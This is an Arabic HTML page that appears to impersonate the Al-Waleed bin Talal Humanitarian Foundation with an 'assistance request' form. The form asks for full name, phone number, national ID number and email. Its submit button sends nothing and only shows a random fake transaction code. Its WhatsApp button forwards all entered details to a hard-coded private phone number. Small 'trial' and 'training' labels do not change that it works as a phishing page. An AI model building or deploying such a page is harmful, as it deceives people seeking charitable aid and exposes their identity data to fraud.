<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>نظام طلب المساعدة - 

<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">

<style>

*{
    box-sizing:border-box;
    font-family:'Cairo',sans-serif;
}

body{
    margin:0;
    background:#f5f7f6;
    direction:rtl;
}


/* شريط تجريبي */
.demo-bar{
    background:#006400;
    color:white;
    text-align:center;
    padding:10px;
    font-size:14px;
    font-weight:bold;
}


/* الهيدر */
.header{
    background:white;
    padding:20px;
    text-align:center;
    box-shadow:0 3px 15px rgba(0,0,0,.08);
}

.header h1{
    color:#008444;
    margin:0;
    font-size:24px;
}


/* صندوق النموذج */
.container{

    width:95%;
    max-width:520px;
    margin:30px auto;

}


.card{

    background:white;
    padding:25px;
    border-radius:20px;
    box-shadow:0 10px 30px rgba(0,0,0,.12);

}


.card h2{

    text-align:center;
    color:#008444;
    margin-bottom:10px;

}


.note{

    text-align:center;
    color:#777;
    font-size:14px;
    margin-bottom:25px;

}


/* الحقول */

.group{

    margin-bottom:15px;

}


.group label{

    display:block;
    margin-bottom:7px;
    font-weight:bold;
    color:#333;

}


.group input,
.group select,
.group textarea{

    width:100%;
    padding:13px;
    border:1px solid #ddd;
    border-radius:12px;
    outline:none;
    font-size:15px;
    background:#fafafa;

}


.group input:focus,
.group select:focus,
.group textarea:focus{

    border-color:#008444;
    background:white;

}



/* زر واتساب */

.whatsapp-btn{

    width:100%;
    padding:15px;
    border:none;
    border-radius:30px;
    background:#25D366;
    color:white;
    font-size:17px;
    font-weight:bold;
    cursor:pointer;
    margin-top:10px;

}


.whatsapp-btn:hover{

    opacity:.9;

}


/* زر ارسال عادي */

.submit-btn{

    width:100%;
    padding:15px;
    border:none;
    border-radius:30px;
    background:#008444;
    color:white;
    font-size:17px;
    font-weight:bold;
    cursor:pointer;
    margin-top:10px;

}



/* إشعار النسخ */

.toast{

    position:fixed;
    top:20px;
    right:50%;
    transform:translateX(50%);
    background:#008444;
    color:white;
    padding:12px 25px;
    border-radius:30px;
    display:none;
    z-index:9999;
    box-shadow:0 5px 20px rgba(0,0,0,.2);

}


/* صفحة التأكيد */

.confirm-box{

    display:none;
    background:white;
    padding:25px;
    border-radius:20px;
    box-shadow:0 10px 30px rgba(0,0,0,.15);
    text-align:center;

}


.code-box{

    background:#f1f8f3;
    border:2px dashed #008444;
    padding:15px;
    font-size:28px;
    font-weight:bold;
    color:#008444;
    border-radius:15px;
    margin:20px 0;

}


.copy-btn{

    background:#008444;
    color:white;
    border:none;
    padding:13px 30px;
    border-radius:25px;
    font-weight:bold;
    cursor:pointer;

}


</style>
</head>
<body>


<div class="demo-bar">
 مؤسسة الوليد بن طلال الإنسانية فقط
</div>


<div class="header">
<h1>
نظام طلب المساعدة
</h1>
</div>


<div class="container">

<div class="card" id="requestCard">

<h2>تقديم طلب مساعدة</h2>

<p class="note">
يرجى تعبئة البيانات التالية لإرسال الطلب
</p>


<div class="group">
<label>الاسم الكامل</label>
<input id="name" type="text" placeholder="اكتب الاسم الكامل">
</div>



<div class="group">
<label>رقم الجوال</label>
<input id="phone" type="tel" placeholder="اكتب رقم الجوال">
</div>



<div class="group">
<label>رقم الهوية</label>
<input id="idNumber" type="text" placeholder="اكتب رقم الهوية">
</div>



<div class="group">
<label>البريد الإلكتروني</label>
<input id="email" type="email" placeholder="example@email.com">
</div>



<div class="group">
<label>نوع المساعدة</label>

<select id="helpType">

<option value="">
اختر نوع المساعدة
</option>

<option>
مساعدة مالية
</option>

<option>
مساعدة سكنية
</option>

<option>
مساعدة علاجية
</option>

<option>
مساعدة تعليمية
</option>

<option>
أخرى
</option>

</select>

</div>




<div class="group">

<label>
تفاصيل الطلب
</label>

<textarea 
id="details"
rows="4"
placeholder="اكتب تفاصيل طلبك">
</textarea>

</div>



<button class="submit-btn" onclick="sendRequest()">
إرسال الطلب
</button>



<button class="whatsapp-btn" onclick="sendWhatsApp()">
🟢 إرسال التفاصيل عبر واتساب
</button>


</div>




<!-- صندوق التأكيد -->

<div class="confirm-box" id="confirmBox">

<h2 style="color:#008444">
تم تسجيل الطلب بنجاح
</h2>


<p>
رقم المعاملة الخاص بك:
</p>


<div class="code-box" id="transactionCode">
A0000
</div>



<button class="copy-btn" onclick="copyCode()">
نسخ الكود
</button>


</div>




</div>



<div class="toast" id="toast">
تم النسخ بنجاح
</div>

<script>


// إنشاء رقم معاملة قصير
function createCode(){

    let letter = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";

    let randomLetter =
    letter[Math.floor(Math.random()*letter.length)];


    let numbers =
    Math.floor(1000 + Math.random()*9000);


    return randomLetter + numbers;

}




// إرسال الطلب وعرض التأكيد

function sendRequest(){


let name =
document.getElementById("name").value.trim();

let phone =
document.getElementById("phone").value.trim();

let idNumber =
document.getElementById("idNumber").value.trim();



if(name==="" || phone==="" || idNumber===""){

alert("يرجى تعبئة الاسم ورقم الجوال ورقم الهوية");

return;

}



let code=createCode();


document.getElementById("transactionCode").innerText=code;



document.getElementById("requestCard").style.display="none";


document.getElementById("confirmBox").style.display="block";


}




// نسخ الكود

function copyCode(){


let code =
document.getElementById("transactionCode").innerText;


navigator.clipboard.writeText(code)
.then(()=>{


let toast =
document.getElementById("toast");


toast.style.display="block";


setTimeout(()=>{

toast.style.display="none";

},2000);



});


}




// إرسال واتساب

function sendWhatsApp(){



let name =
document.getElementById("name").value.trim();


let phone =
document.getElementById("phone").value.trim();


let idNumber =
document.getElementById("idNumber").value.trim();


let email =
document.getElementById("email").value.trim();


let help =
document.getElementById("helpType").value;


let details =
document.getElementById("details").value.trim();




if(name==="" || phone==="" || idNumber===""){

alert("يرجى إدخال الاسم ورقم الجوال ورقم الهوية");

return;

}




let message =

"📌 طلب تجريبي جديد\n\n"+

"👤 الاسم: "+name+"\n"+

"📱 الجوال: "+phone+"\n"+

"🪪 الهوية: "+idNumber+"\n"+

"📧 البريد: "+email+"\n"+

"📂 نوع المساعدة: "+help+"\n"+

"📝 التفاصيل: "+details+"\n\n"+

"⚠️ نموذج تجريبي للتدريب فقط";




let whatsappNumber="966580272758";



let url=

"https://wa.me/"+

whatsappNumber+

"?text="+

encodeURIComponent(message);



window.open(url,"_blank");

}



</script>


</body>
</html>
